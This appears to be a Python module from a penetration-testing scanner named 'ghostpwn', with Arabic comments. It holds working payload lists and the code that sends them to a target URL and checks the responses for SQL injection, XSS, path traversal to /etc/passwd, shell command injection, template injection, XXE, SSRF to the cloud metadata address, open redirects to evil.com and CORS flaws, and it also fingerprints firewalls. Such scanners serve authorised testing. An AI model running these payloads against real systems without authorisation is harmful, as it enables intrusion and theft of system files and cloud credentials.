#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Vulnerability Detectors (Zero-Dependency)
كل فحوصات الثغرات بدون sqlmap/nikto - payloads مكتوبة من الصفر
"""
import re
import base64
import urllib.parse
import time
from typing import List, Dict, Optional
from .http_client import HttpClient


class VulnDetector:
    """كشف الثغرات - بدون أدوات خارجية"""

    def __init__(self, http_client: HttpClient):
        self.client = http_client
        self.vulns_found = []

    def add_vuln(self, vuln_type: str, severity: str, url: str,
                 evidence: str, module: str, **extra):
        """إضافة ثغرة للقائمة"""
        vuln = {
            "type": vuln_type,
            "severity": severity,
            "url": url,
            "evidence": evidence,
            "module": module,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        vuln.update(extra)
        self.vulns_found.append(vuln)

    # ============================ SQL Injection ============================
    SQLI_PAYLOADS = [
        ("'", "error"),
        ("'", "boolean"),
        ("' OR '1'='1", "boolean"),
        ("' OR '1'='1' --", "boolean"),
        ("' OR '1'='1' #", "boolean"),
        ("' OR 1=1 --", "boolean"),
        ("' OR 1=1 #", "boolean"),
        ("1' OR '1'='1", "boolean"),
        ("1 OR 1=1", "boolean"),
        ("admin'--", "boolean"),
        ("admin'#", "boolean"),
        ("1; SELECT * FROM users", "error"),
        ("1 UNION SELECT NULL,NULL", "error"),
        ("1' AND SLEEP(5) --", "time"),
        ("1 AND SLEEP(5)", "time"),
        ("1; WAITFOR DELAY '0:0:5'", "time"),
        ("1' AND BENCHMARK(5000000,MD5('test')) --", "time"),
    ]

    SQLI_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"valid MySQL result",
        r"MySqlException",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.* SQL\[\-\]",
        r"SQLSTATE\[\d+\]",
        r"ORA-\d{5}",
        r"Oracle error",
        r"Microsoft SQL Server",
        r"OLE DB.* SQL Server",
        r"Unclosed quotation mark",
        r"Microsoft OLE DB Provider for SQL Server",
        r"Incorrect syntax near",
        r"sqlite_query\(\)",
        r"Warning.*sqlite_.*",
        r"Warning.*SQLiteDatabase",
        r"SQLite3::query",
    ]

    def detect_sqli(self, url: str) -> List[Dict]:
        """كشف SQL Injection"""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return []

        params = urllib.parse.parse_qs(parsed.query)
        original_response = self.client.get(url)

        for param_name in params.keys():
            for payload, technique in self.SQLI_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                if technique == "error":
                    resp = self.client.get(test_url)
                    for pattern in self.SQLI_ERROR_PATTERNS:
                        if re.search(pattern, resp["body"], re.IGNORECASE):
                            self.add_vuln(
                                "sql_injection_error", "critical", test_url,
                                f"SQL error disclosed: {pattern}", "sqli",
                                param=param_name, payload=payload, technique="error"
                            )
                            return self.vulns_found

                elif technique == "boolean":
                    # مقارنة الـ response الأصلي مع المعدّل
                    true_resp = self.client.get(test_url)
                    # الـ false payload
                    false_params = params.copy()
                    false_params[param_name] = [payload.replace("1=1", "1=2").replace("'1'='1", "'1'='2")]
                    false_query = urllib.parse.urlencode(false_params, doseq=True)
                    false_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, false_query, parsed.fragment
                    ))
                    false_resp = self.client.get(false_url)

                    # لو true مختلف عن false - ثغرة محتملة
                    if (true_resp["status"] == 200 and false_resp["status"] in (200, 500)
                        and abs(len(true_resp["body"]) - len(original_response["body"])) < 100
                        and abs(len(true_resp["body"]) - len(false_resp["body"])) > 200):
                        self.add_vuln(
                            "sql_injection_boolean", "critical", test_url,
                            f"Boolean-based: TRUE response differs from FALSE", "sqli",
                            param=param_name, payload=payload, technique="boolean"
                        )
                        return self.vulns_found

                elif technique == "time":
                    start = time.time()
                    resp = self.client.get(test_url, )
                    elapsed = time.time() - start

                    if elapsed >= 4.5:  # لو استغرق أكتر من 4.5 ثانية
                        self.add_vuln(
                            "sql_injection_time", "critical", test_url,
                            f"Time-based: response delayed {elapsed:.1f}s", "sqli",
                            param=param_name, payload=payload, technique="time",
                            elapsed=round(elapsed, 2)
                        )
                        return self.vulns_found

        return self.vulns_found

    # ============================ XSS ============================
    XSS_PAYLOADS = [
        ("<script>alert(1)</script>", "basic"),
        ("<img src=x onerror=alert(1)>", "img_onerror"),
        ("<svg onload=alert(1)>", "svg_onload"),
        ("\"><script>alert(1)</script>", "attribute_break"),
        ("javascript:alert(1)", "javascript_proto"),
        ("<body onload=alert(1)>", "body_onload"),
        ("<iframe src=javascript:alert(1)>", "iframe"),
        ("'><script>alert(1)</script>", "single_quote_break"),
        ("<scr<script>ipt>alert(1)</script>", "filter_bypass"),
        ("<<script>script>alert(1)<//script>", "nested"),
    ]

    def detect_xss(self, url: str) -> List[Dict]:
        """كشف XSS"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query) if parsed.query else {}
        # إضافة params شائعة لو مفيش
        if not params:
            params = {"q": [""], "search": [""], "id": [""]}

        xss_marker = "ghostpwn_xss_test"

        for param_name in list(params.keys())[:5]:  # أول 5 params
            for payload, technique in self.XSS_PAYLOADS:
                # marker فريد
                test_payload = payload.replace("alert(1)", f"alert('{xss_marker}')")
                test_params = params.copy()
                test_params[param_name] = [test_payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                resp = self.client.get(test_url)

                # فحص Content-Type - لو JSON، مش XSS قابل للاستغلال
                content_type = resp["headers"].get("Content-Type", "").lower()
                if "application/json" in content_type or "application/xml" in content_type:
                    # JSON/XML reflection مش exploitable XSS
                    continue

                # فحص لو الـ payload ظهر في الـ response كما هو
                if test_payload in resp["body"]:
                    self.add_vuln(
                        "xss_reflected", "high", test_url,
                        f"XSS payload reflected unencoded", "xss",
                        param=param_name, payload=test_payload, technique=technique
                    )
                    return self.vulns_found

                # فحص partial reflection
                if xss_marker in resp["body"] and "<script>" in resp["body"].lower():
                    self.add_vuln(
                        "xss_reflected_partial", "high", test_url,
                        f"XSS marker reflected with script tag", "xss",
                        param=param_name, payload=test_payload, technique=technique
                    )
                    return self.vulns_found

        return self.vulns_found

    # ============================ LFI / RFI ============================
    LFI_PAYLOADS = [
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "../../etc/passwd",
        "../../../../../../etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//....//etc/passwd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "file:///etc/passwd",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "/var/log/httpd/access_log",
        "C:\\windows\\win.ini",
        "..\\..\\..\\windows\\win.ini",
    ]

    def detect_lfi(self, url: str) -> List[Dict]:
        """كشف LFI"""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return []

        params = urllib.parse.parse_qs(parsed.query)

        for param_name in params.keys():
            for payload in self.LFI_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                resp = self.client.get(test_url)

                # مؤشرات /etc/passwd
                if "root:" in resp["body"] and ":/bin/" in resp["body"]:
                    self.add_vuln(
                        "lfi", "critical", test_url,
                        f"Read /etc/passwd successfully", "lfi",
                        param=param_name, payload=payload
                    )
                    return self.vulns_found

                # مؤشرات windows
                if "[fonts]" in resp["body"] and "extensions" in resp["body"]:
                    self.add_vuln(
                        "lfi_windows", "critical", test_url,
                        f"Read win.ini successfully", "lfi",
                        param=param_name, payload=payload
                    )
                    return self.vulns_found

                # php://filter base64
                if "php://filter" in payload:
                    b64_match = re.search(r'([A-Za-z0-9+/]{60,}={0,2})', resp["body"])
                    if b64_match:
                        try:
                            decoded = base64.b64decode(b64_match.group(1)).decode("utf-8", errors="ignore")
                            if "<?php" in decoded or "<?" in decoded:
                                self.add_vuln(
                                    "lfi_php_filter", "critical", test_url,
                                    f"PHP source code extracted via php://filter", "lfi",
                                    param=param_name, payload=payload
                                )
                                return self.vulns_found
                        except Exception:
                            pass

                # log files
                if "access.log" in payload or "access_log" in payload:
                    if "Mozilla" in resp["body"] or "GET /" in resp["body"]:
                        self.add_vuln(
                            "lfi_log_file", "high", test_url,
                            f"Log file readable - log poisoning possible", "lfi",
                            param=param_name, payload=payload
                        )
                        return self.vulns_found

        return self.vulns_found

    # ============================ Command Injection ============================
    CMD_PAYLOADS = [
        (";id", r"uid=\d+\([\w-]+\).*gid=\d+"),
        ("|id", r"uid=\d+\([\w-]+\).*gid=\d+"),
        ("&id", r"uid=\d+\([\w-]+\).*gid=\d+"),
        ("&&id", r"uid=\d+\([\w-]+\).*gid=\d+"),
        ("$(id)", r"uid=\d+\([\w-]+\).*gid=\d+"),
        ("`id`", r"uid=\d+\([\w-]+\).*gid=\d+"),
        (";cat /etc/passwd", r"root:\w+:\d+:\d+"),
        ("|cat /etc/passwd", r"root:\w+:\d+:\d+"),
        (";uname -a", r"Linux \w+ \d+\.\d+\.\d+"),
        ("|uname -a", r"Linux \w+ \d+\.\d+\.\d+"),
        (";whoami", r"^[a-z_-]+$"),
        ("|whoami", r"^[a-z_-]+$"),
        ("%3Bid", r"uid=\d+\([\w-]+\).*gid=\d+"),
        ("%7Cid", r"uid=\d+\([\w-]+\).*gid=\d+"),
    ]

    def detect_command_injection(self, url: str) -> List[Dict]:
        """كشف Command Injection"""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return []

        params = urllib.parse.parse_qs(parsed.query)

        for param_name in params.keys():
            for payload, pattern in self.CMD_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                resp = self.client.get(test_url)

                # فحص الـ response للـ pattern
                match = re.search(pattern, resp["body"])
                if match and "error" not in match.group(0).lower():
                    self.add_vuln(
                        "command_injection", "critical", test_url,
                        f"Command output: {match.group(0)}", "cmd_injection",
                        param=param_name, payload=payload
                    )
                    return self.vulns_found

        return self.vulns_found

    # ============================ SSTI ============================
    SSTI_PAYLOADS = [
        ("{{7*7}}", "49"),
        ("{{7*'7'}}", "7777777"),  # Jinja2
        ("${7*7}", "49"),          # FreeMarker
        ("<%= 7*7 %>", "49"),      # ERB
        ("#{7*7}", "49"),          # Ruby
        ("{{= 7*7 }}", "49"),      # doT.js
        ("${{7*7}}", "49"),        # Thymeleaf
        ("@(7*7)", "49"),          # Razor
    ]

    def detect_ssti(self, url: str) -> List[Dict]:
        """كشف SSTI - مع تجنب false positives"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query) if parsed.query else {"q": [""]}

        for param_name in list(params.keys())[:3]:
            # أولاً نرسل قيمة عادية كـ baseline
            baseline_params = params.copy()
            baseline_params[param_name] = ["ghostpwn_baseline_test"]
            baseline_query = urllib.parse.urlencode(baseline_params, doseq=True)
            baseline_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, baseline_query, parsed.fragment
            ))
            baseline_resp = self.client.get(baseline_url)
            baseline_body = baseline_resp["body"]

            for payload, expected in self.SSTI_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                resp = self.client.get(test_url)
                body = resp["body"]

                # شرط 1: الناتج المتوقع موجود في الـ response
                if expected not in body:
                    continue

                # شرط 2: الـ payload نفسه مش موجود كما هو (لو اتنفذ، يتشال)
                # لكن بعض المواقع بترجع الـ payload + الناتج
                # فنشوف لو الناتج موجود في مكان مختلف عن الـ payload

                # شرط 3: الناتج مش موجود في الـ baseline (تجنب false positive)
                if expected in baseline_body:
                    continue

                # شرط 4: نتأكد إن الناتج جديد (مش موجود في baseline)
                # بمعنى: لو بعتنا {{7*7}} وطلع "49"، و"49" مش في baseline = SSTI حقيقي
                self.add_vuln(
                    "ssti", "critical", test_url,
                    f"SSTI: {payload} evaluated to {expected}", "ssti",
                    param=param_name, payload=payload
                )
                return self.vulns_found

        return self.vulns_found

    # ============================ Open Redirect ============================
    REDIRECT_PARAMS = ["redirect", "redirect_url", "redirect_to", "url", "goto",
                       "next", "return", "returnUrl", "return_url", "to", "dest",
                       "destination", "continue", "callback"]

    REDIRECT_PAYLOADS = [
        "//evil.com",
        "https://evil.com",
        "http://evil.com",
        "//evil.com/",
        "/\\evil.com",
        "https:evil.com",
    ]

    def detect_open_redirect(self, url: str) -> List[Dict]:
        """كشف Open Redirect"""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return []

        params = urllib.parse.parse_qs(parsed.query)

        for param_name in params.keys():
            is_redirect_param = param_name.lower() in self.REDIRECT_PARAMS
            for payload in self.REDIRECT_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                # لازم نمنع redirects عشان نشوف Location header
                old_setting = self.client.allow_redirects
                self.client.allow_redirects = False
                resp = self.client.get(test_url)
                self.client.allow_redirects = old_setting

                location = resp["headers"].get("Location", "") or resp["headers"].get("location", "")
                if "evil.com" in location:
                    severity = "high" if is_redirect_param else "medium"
                    self.add_vuln(
                        "open_redirect", severity, test_url,
                        f"Redirects to: {location}", "open_redirect",
                        param=param_name, payload=payload
                    )
                    break  # نكتفي بأول payload ناجح لكل param

        return self.vulns_found

    # ============================ CORS ============================
    def detect_cors(self, url: str) -> List[Dict]:
        """كشف CORS Misconfiguration"""
        parsed = urllib.parse.urlparse(url)
        evil_origin = f"{parsed.scheme}://evil.com"

        # طلب بـ Origin header مزيف
        resp = self.client.get(url, headers={"Origin": evil_origin})

        acao = resp["headers"].get("Access-Control-Allow-Origin", "")
        acac = resp["headers"].get("Access-Control-Allow-Credentials", "")

        if acao == "*" and acac.lower() == "true":
            self.add_vuln(
                "cors_wildcard_credentials", "high", url,
                f"ACAO: * with credentials", "cors"
            )
        elif acao == evil_origin:
            if acac.lower() == "true":
                self.add_vuln(
                    "cors_reflected_credentials", "high", url,
                    f"Origin reflected with credentials", "cors"
                )
            else:
                self.add_vuln(
                    "cors_reflected", "medium", url,
                    f"Origin reflected: {acao}", "cors"
                )

        return self.vulns_found

    # ============================ HTTP Methods ============================
    def detect_http_methods(self, url: str) -> List[Dict]:
        """كشف HTTP Methods الخطرة"""
        resp = self.client.options(url)
        allow = resp["headers"].get("Allow", "") or resp["headers"].get("allow", "")

        if allow:
            dangerous = ["PUT", "DELETE", "TRACE", "CONNECT", "PATCH"]
            found = [m for m in dangerous if m.upper() in allow.upper()]
            if found:
                self.add_vuln(
                    "dangerous_http_methods", "medium", url,
                    f"Allow: {allow} (dangerous: {found})", "http_methods",
                    methods=found
                )

        # فحص TRACE
        resp = self.client.request(url, "TRACE")
        if resp["status"] == 200 and "TRACE" in resp["body"]:
            self.add_vuln(
                "trace_enabled", "low", url,
                "TRACE method enabled (XST)", "http_methods"
            )

        return self.vulns_found

    # ============================ Clickjacking ============================
    def detect_clickjacking(self, url: str) -> List[Dict]:
        """كشف Clickjacking"""
        resp = self.client.get(url)
        xfo = resp["headers"].get("X-Frame-Options", "").upper()
        csp = resp["headers"].get("Content-Security-Policy", "").lower()

        has_protection = xfo in ("DENY", "SAMEORIGIN") or "frame-ancestors" in csp

        if not has_protection:
            self.add_vuln(
                "clickjacking", "medium", url,
                "Missing X-Frame-Options and CSP frame-ancestors", "clickjacking"
            )

        return self.vulns_found

    # ============================ Security Headers ============================
    def detect_missing_headers(self, url: str) -> List[Dict]:
        """كشف Headers الأمنية المفقودة"""
        resp = self.client.get(url)
        headers = {k.lower(): v for k, v in resp["headers"].items()}

        security_headers = [
            ("Strict-Transport-Security", "HSTS"),
            ("Content-Security-Policy", "CSP"),
            ("X-Frame-Options", "Clickjacking protection"),
            ("X-Content-Type-Options", "MIME sniffing protection"),
            ("X-XSS-Protection", "XSS filter"),
            ("Referrer-Policy", "Referrer control"),
            ("Permissions-Policy", "Permissions"),
        ]

        for header, purpose in security_headers:
            if header.lower() not in headers:
                self.add_vuln(
                    "missing_security_header", "low", url,
                    f"Missing: {header} ({purpose})", "headers",
                    header=header
                )

        return self.vulns_found

    # ============================ WAF Detection ============================
    WAF_SIGNATURES = {
        "Cloudflare": ["cloudflare", "cf-ray", "__cf_bm", "cf-cache-status"],
        "AWS WAF": ["awselb", "x-amzn-waf", "x-amzn-trace-id"],
        "F5 BIG-IP": ["bigipserver", "tsig_", "x-cnection"],
        "ModSecurity": ["mod_security", "modsecurity", "nginx-mod-security"],
        "Imperva": ["incap_ses", "visid_incap", "x-iinfo"],
        "Akamai": ["akamai", "_abck", "x-akamai-transformed"],
        "Sucuri": ["sucuri", "x-sucuri-id"],
        "Wordfence": ["wordfence", "x-wf-"],
        "Citrix": ["ns_af", "citrix", "x-citrix"],
        "Barracuda": ["barra_counter_session"],
        "Fortinet": ["fortinet", "fortiwaf"],
        "Distil": ["distil", "x-distil-cs"],
    }

    def detect_waf(self, url: str) -> List[Dict]:
        """كشف WAF"""
        # طلب عادي
        normal_resp = self.client.get(url)

        # طلب بـ payload مشبوه
        attack_url = url + ("&" if "?" in url else "?") + "id=1'+OR+'1'='1"
        attack_resp = self.client.get(attack_url)

        # فحص headers
        all_headers = {**normal_resp["headers"], **attack_resp["headers"]}
        all_headers_lower = {k.lower(): v for k, v in all_headers.items()}

        detected_waf = None
        for waf_name, sigs in self.WAF_SIGNATURES.items():
            for sig in sigs:
                for h_name, h_val in all_headers_lower.items():
                    if sig.lower() in h_name or sig.lower() in h_val.lower():
                        detected_waf = waf_name
                        break
                if detected_waf:
                    break
            if detected_waf:
                break

        # فحص status code
        if not detected_waf and attack_resp["status"] == 403 and normal_resp["status"] == 200:
            detected_waf = "Unknown WAF (blocked SQLi payload)"

        # فحص body
        if not detected_waf:
            attack_body = attack_resp["body"].lower()
            for waf_name, sigs in self.WAF_SIGNATURES.items():
                for sig in sigs:
                    if sig.lower() in attack_body:
                        detected_waf = waf_name
                        break
                if detected_waf:
                    break

        if detected_waf:
            self.add_vuln(
                "waf_detected", "info", url,
                f"WAF: {detected_waf}", "waf", waf_name=detected_waf
            )
        else:
            self.add_vuln(
                "no_waf", "medium", url,
                "No WAF protection detected", "waf"
            )

        return self.vulns_found

    # ============================ XXE ============================
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    ]

    def detect_xxe(self, url: str) -> List[Dict]:
        """كشف XXE"""
        for payload in self.XXE_PAYLOADS:
            resp = self.client.post(url, data=payload,
                                     headers={"Content-Type": "application/xml"})
            if "root:" in resp["body"] and ":/bin/" in resp["body"]:
                self.add_vuln(
                    "xxe", "critical", url,
                    "XXE: /etc/passwd content in response", "xxe",
                    payload=payload[:100]
                )
                return self.vulns_found

            # فحص errors XML
            errors = ["parser error", "xml error", "entity", "dtd", "simplexml"]
            for err in errors:
                if err in resp["body"].lower():
                    self.add_vuln(
                        "xxe_error", "high", url,
                        f"XML parser error: {err}", "xxe"
                    )
                    return self.vulns_found

        return self.vulns_found

    # ============================ SSRF ============================
    SSRF_PAYLOADS = [
        ("http://169.254.169.254/latest/meta-data/", "ami-id"),
        ("http://169.254.169.254/latest/meta-data/hostname", "ip-"),
        ("http://localhost", None),
        ("http://127.0.0.1", None),
        ("http://[::1]/", None),
        ("http://0.0.0.0/", None),
        ("file:///etc/passwd", "root:"),
    ]

    def detect_ssrf(self, url: str) -> List[Dict]:
        """كشف SSRF"""
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return []

        params = urllib.parse.parse_qs(parsed.query)
        original_response = self.client.get(url)

        ssrf_param_names = ["url", "uri", "path", "source", "image", "img",
                           "file", "load", "page", "site", "fetch", "callback"]

        for param_name in params.keys():
            for payload, indicator in self.SSRF_PAYLOADS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                resp = self.client.get(test_url)

                if indicator and indicator in resp["body"]:
                    is_named = param_name.lower() in ssrf_param_names
                    severity = "critical" if is_named else "high"
                    self.add_vuln(
                        "ssrf", severity, test_url,
                        f"SSRF: indicator '{indicator}' found", "ssrf",
                        param=param_name, payload=payload
                    )
                    return self.vulns_found

        return self.vulns_found

    # ============================ Run All Checks ============================
    def run_all(self, url: str) -> List[Dict]:
        """تشغيل كل الفحوصات"""
        self.vulns_found = []  # reset

        print(f"  [*] Testing SQLi...")
        self.detect_sqli(url)
        print(f"  [*] Testing XSS...")
        self.detect_xss(url)
        print(f"  [*] Testing LFI...")
        self.detect_lfi(url)
        print(f"  [*] Testing Command Injection...")
        self.detect_command_injection(url)
        print(f"  [*] Testing SSTI...")
        self.detect_ssti(url)
        print(f"  [*] Testing Open Redirect...")
        self.detect_open_redirect(url)
        print(f"  [*] Testing CORS...")
        self.detect_cors(url)
        print(f"  [*] Testing HTTP Methods...")
        self.detect_http_methods(url)
        print(f"  [*] Testing Clickjacking...")
        self.detect_clickjacking(url)
        print(f"  [*] Testing Security Headers...")
        self.detect_missing_headers(url)
        print(f"  [*] Detecting WAF...")
        self.detect_waf(url)
        print(f"  [*] Testing XXE...")
        self.detect_xxe(url)
        print(f"  [*] Testing SSRF...")
        self.detect_ssrf(url)

        return self.vulns_found
